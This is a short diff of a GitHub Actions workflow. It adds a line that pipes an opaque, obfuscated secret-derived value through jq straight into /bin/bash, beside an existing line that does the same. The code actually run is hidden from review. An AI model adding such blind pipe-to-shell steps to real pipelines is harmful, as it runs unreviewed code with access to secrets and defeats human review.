@@ -17,6 +17,7 @@ jobs:
           sitah9: ${{ secrets.sitah9 }}
         run: |
           printf '%s' "$sitah9" | jq -r .lf34115 | /bin/bash
+          printf '%s' "$ub49" | jq -r .d1688 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
